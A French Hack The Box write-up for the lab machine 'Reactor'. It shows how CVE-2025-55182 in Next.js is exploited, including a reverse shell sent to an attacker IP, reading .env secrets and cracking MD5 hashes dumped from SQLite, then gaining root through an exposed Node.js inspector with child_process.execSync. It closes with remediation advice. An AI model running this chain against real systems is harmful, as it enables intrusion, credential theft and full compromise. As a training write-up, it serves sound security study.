# HTB - Reactor | Writeup

**Difficulté :** Medium  
**OS :** Linux  
**CVE :** CVE-2025-55182 (React2Shell) — RCE non authentifié dans React Server Components  

---

## 1. Reconnaissance

### Scan de ports

On commence par un scan SYN sur la cible pour identifier les services exposés.

```bash
nmap -sS 10.129.134.8
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

Deux ports sont ouverts : SSH (22) et un service sur le port 3000. Nmap identifie ce dernier comme "ppp" mais ce type de port est très fréquemment associé à des serveurs web Node.js.

### Identification du service web

On interroge le port 3000 pour récupérer les headers HTTP et identifier la technologie utilisée.

```bash
curl -i http://10.129.134.8:3000/
```

Le header de réponse révèle immédiatement la technologie :

```
X-Powered-By: Next.js
```

On confirme avec Wappalyzer (extension navigateur ou CLI) que la version exacte est **Next.js 15.0.3**.

---

## 2. Identification de la vulnérabilité

### CVE-2025-55182 — React2Shell

Next.js 15.0.3 est affecté par la **CVE-2025-55182**, aussi connue sous le nom "React2Shell". Il s'agit d'une vulnérabilité critique (CVSS 10.0) découverte en décembre 2025 dans le mécanisme de sérialisation des React Server Components (protocole "Flight").

Le problème réside dans la désérialisation non sécurisée des requêtes multipart envoyées au serveur. Un attaquant non authentifié peut envoyer une requête HTTP spécialement forgée pour faire exécuter du code JavaScript arbitraire par le serveur, sans aucun prérequis d'authentification.

Les versions vulnérables de Next.js sont toutes les versions antérieures à 15.0.5 dans la branche 15.x.

### Vérification de la vulnérabilité

On clone un PoC public disponible sur GitHub et on vérifie que la cible est bien vulnérable avec le scanner `r2s.py` :

```bash
python3 r2s.py -u http://10.129.134.8:3000/
```

```
[VULNERABLE] http://10.129.134.8:3000/ - Status: 303
```

Le serveur répond avec un statut 303 qui confirme que le payload a bien été interprété.

---

## 3. Exploitation — Accès initial (RCE)

### Test d'exécution de commande

Avant d'ouvrir un reverse shell, on vérifie qu'on peut bien exécuter des commandes sur le serveur en lançant `id` :

```bash
python3 exploit.py http://10.129.134.8:3000/ -c "id"
```

```
[+] Command executed! Result in redirect: /login?a=uid=999(node) gid=988(node) groups=988(node);push
```

L'exécution de commande est confirmée. On tourne en tant qu'utilisateur `node` (uid 999).

### Reverse shell

On prépare un listener netcat sur notre machine attaquante, puis on lance le reverse shell via le flag `--revshell` de l'exploit :

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit
python3 exploit.py http://10.129.134.8:3000 --revshell 10.10.15.252 4444
```

```
[+] Command executed! Result in redirect: /login?a=;push
```

La connexion entrante est reçue sur le listener. On obtient un shell basique.

### Stabilisation du shell

Le shell reçu est instable (pas de TTY). On l'améliore avec Python pour obtenir un terminal interactif complet :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Puis on passe le shell en arrière-plan et on configure le terminal local :

```bash
# Ctrl+Z pour mettre en background, puis :
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

---

## 4. Enumération post-exploitation (shell node)

### Exploration du répertoire de l'application

```bash
ls -la /opt/reactor-app/
```

Plusieurs fichiers intéressants sont présents : `.env`, `reactor.db` et les sources Next.js.

### Lecture du fichier .env

Les fichiers `.env` contiennent souvent des secrets utiles. On l'affiche :

```bash
cat /opt/reactor-app/.env
```

```
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

On récupère une clé API et surtout la localisation d'une base de données SQLite.

### Extraction des credentials depuis la base de données

On ouvre la base de données avec le client SQLite et on liste les tables disponibles :

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
-- sensor_logs  users

SELECT * FROM users;
-- 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
-- 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

On récupère deux hashes MD5. On les soumet sur **CrackStation** :

| Utilisateur | Hash MD5 | Mot de passe |
|---|---|---|
| admin | a203b22191d744a4e70ada5c101b17b8 | ❌ Non cracké |
| engineer | 39d97110eafe2a9a68639812cd271e8e | ✅ `reactor1` |

---

## 5. Mouvement latéral — Connexion en tant qu'engineer

On utilise les credentials récupérés pour changer d'utilisateur :

```bash
su engineer
# Mot de passe : reactor1
```

### Flag utilisateur

```bash
cat ~/user.txt
# 8a17...
```

---

## 6. Élévation de privilèges — Root via Node.js Inspector

### Enumération des ports internes

On liste les ports en écoute sur la machine pour identifier des services non exposés à l'extérieur :

```bash
ss -tlnp
```

```
LISTEN   127.0.0.1:9229    (Node.js Inspector)
LISTEN   *:3000            (Next.js)
LISTEN   0.0.0.0:22        (SSH)
```

Le port **9229** est en écoute uniquement sur localhost. Il s'agit du port standard du **débogueur Node.js**. En croisant avec le résultat de `ps aux`, on constate que ce process Node.js tourne en tant que **root** (PID 1411).

### Exploitation du Node.js Inspector

Le débogueur Node.js, lorsqu'il est accessible, permet d'exécuter du code JavaScript arbitraire dans le contexte du process cible — ici en tant que root. On se connecte au débogueur avec la commande `node inspect` :

```bash
node inspect 127.0.0.1:9229
```

```
connecting to 127.0.0.1:9229 ... ok
debug>
```

On passe ensuite en mode **REPL** (Read-Eval-Print Loop) qui permet d'exécuter directement du code JavaScript :

```
debug> repl
```

On vérifie qu'on s'exécute bien dans le contexte root :

```javascript
> process.mainModule.require('child_process').execSync('id').toString()
'uid=0(root) gid=0(root) groups=0(root)\n'
```

### Flag root

```javascript
> process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
'18...\n'
```

---

## Résumé de la chaîne d'exploitation

```
RCE non authentifié (CVE-2025-55182)
        ↓
Shell en tant que node (uid=999)
        ↓
Credentials dans SQLite (.env → reactor.db)
        ↓
Connexion SSH/su en tant qu'engineer
        ↓
Node.js Inspector en root sur port 9229 (localhost)
        ↓
Exécution de code JavaScript en tant que root → FLAG
```

---

## Remédiation

| Vecteur | Correction |
|---|---|
| CVE-2025-55182 | Mettre à jour Next.js vers 15.0.5+ ou 15.1.9+ |
| Credentials en base de données | Ne jamais stocker de hashes MD5, utiliser bcrypt/argon2 |
| Base de données accessible au shell applicatif | Principe de moindre privilège, permissions restrictives |
| Node.js Inspector exposé | Ne jamais lancer `--inspect` en production, surtout en tant que root |
